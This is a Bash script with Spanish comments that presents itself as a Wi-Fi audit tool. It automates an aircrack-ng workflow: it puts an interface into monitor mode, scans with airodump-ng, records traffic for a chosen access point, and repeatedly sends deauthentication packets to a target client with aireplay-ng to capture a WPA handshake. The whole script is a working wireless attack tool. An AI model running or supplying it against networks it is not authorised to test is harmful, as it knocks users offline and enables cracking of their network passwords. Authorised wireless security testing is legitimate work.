# Crea una carpeta donde se guardara todo

mkdir Auditoria_$(date +%Y-%m-%d)

until [ "$option1" = "3" ]
do

# se ejecuta el script para el logo y informacion de el programa

echo -e "\e[1;31m$(cat log/log1)\e[0m"
cd Auditoria_$(date +%Y-%m-%d)

# menu de opciones para seleccionar la accion que se desea llevar a cabo

echo ""
echo -e "\033[33m[-] Menu de opciones:\033[0m"
echo ""
echo "[1] Colocar interfaz en modo monitor"
echo "[2] Iniciar auditoria"
echo "[3] Salir"
echo ""
echo -e "\033[36m[*] Menu de estado:\033[0m"
echo ""
echo "[-] Interfaz actual: $interfaz" 
echo ""

read -p $'\e[31m[-] Elige una opcion: \e[0m ' option1

# empieza el menu de casos segun la opcion que se haya tomado

case $option1 in
	
	"1")
		echo ""
		echo -e "\033[32m[-] Interfaces Disponibles:\033[0m"
		echo ""

		# Lista las interfaces disponibles

		ifconfig

		read -p $'\e[33m[-] Escribe el nombre de tu interfaz: \e[0m ' interfazmon

		# coloca la interfaz en modo monitor

		sudo airmong-ng check kill
		sudo airmon-ng start $interfazmon

		echo -e "\033[31m[-] Colocando tu interfaz en modo monitor..\033[0m"

		clear

		echo -e "\033[32m[-] Tu interfaz fue puesta en modo monitor, nueva lista de interfaces disponibles:\033[0m"
		echo ""

		# Lista las interfaces disponibles

		ifconfig

		read -p $'\e[33m[-] Escribe el nombre de tu interfaz en modo monitor: \e[0m ' interfaz
		echo "$interfaz" > interfaz.txt
		cd ..
		clear
		;;

	"2")
		echo ""

		echo -e "\033[31m[-] Buscando las redes disponibles a auditar... No cierre la terminal\033[0m"
		echo ""

		kitty --hold bash -c "sudo airodump-ng '$interfaz'; exec bash" 2>/dev/null &


		clear

		# Salida de las redes disponibles para auditar

		echo -e "\033[32m[-] Escaneo en proceso...\033[0m"

		echo ""

		# Panel para que el usuario pueda ingresar los datos para realizar la auditoria

		read -p $'\e[33m[-] Ingresa el BSSID de la red a auditar: \e[0m ' bssid

		echo "$bssid" > bssid.txt

		echo ""

		read -p $'\e[33m[-] Ingresa el canal de la red a auditar: \e[0m ' ch

		pkill -f "kitty --hold bash -c .*airodump-ng"

		echo ""

		kitty --hold bash -c "sudo airodump-ng --channel '$ch' --bssid '$bssid' -w Auditoria '$interfaz'; exec bash" 2>/dev/null &

		clear

		read -p $'\e[33m[-] Ingresa la estacion de la red a auditar: \e[0m ' station
		echo ""

		clear
		echo -e "\033[32m[-] Lanzando paquetes\033[0m"
		echo ""
		sudo aireplay-ng -0 9 -a $bssid -c $station $interfaz

		until [ "$pkgrespnd" = "n" ]
		do

		echo ""
		read -p $'\e[32m[-] ¿Desea volver a enviar paquetes? y/n \e[0m ' pkgrespnd

		case $pkgrespnd in

		"y") 
		echo ""
		echo -e "\033[32m[-] Lanzando paquetes\033[0m"
		echo ""
		sudo aireplay-ng -0 9 -a $bssid -c $station $interfaz
		;;

		"n")
		clear
		echo -e "\033[33m[-] Handshake capturado, volviendo al menu principal\033[0m"
		echo ""
		;;

		*)
		echo ""
		echo -e "\033[31m[-] Opcion Invalida, vuelva a intentarlo.\033[0m"
		echo ""
		;;


		# Termina el menu de casos
		esac

		# termina el bucle de el menu principal
		done
		
		cd ..
		clear
		echo -e "\033[32m[!] Auditoria finalizada\033[0m"
		echo ""
	;;

	"3")
		clear
		echo -e "\033[32m[!] Regresando a el menu principal\033[0m"
		echo ""
	;;
	
	*)
		clear
		echo -e "\033[31m[!] Opcion invalida, repita denuevo.\033[0m"
		cd ..
	;;


# Termina el menu de casos
esac

# termina el bucle de el menu principal
done

